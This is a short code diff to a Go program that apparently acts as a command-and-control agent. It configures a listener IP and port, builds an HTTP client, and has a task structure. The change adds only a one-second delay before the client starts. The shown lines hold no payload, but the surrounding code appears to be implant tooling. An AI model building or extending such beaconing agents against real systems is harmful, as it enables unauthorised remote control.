@@ -33,6 +33,7 @@ type Task struct {
 
 var name, LISTENER_IP, LISTENER_PORT, URL string
 var sleep_time int = 5
+var delay int = 1
 var output = ""
 var success = false
 
@@ -183,6 +184,8 @@ func main() {
 	LISTENER_IP = "192.168.172.1"
 	LISTENER_PORT = "9999"
 	URL = "http://" + LISTENER_IP + ":" + LISTENER_PORT
+	time.Sleep(time.Duration(delay) * time.Second)
+
 	// Set up the HTTP client
 	client := &http.Client{}
 	
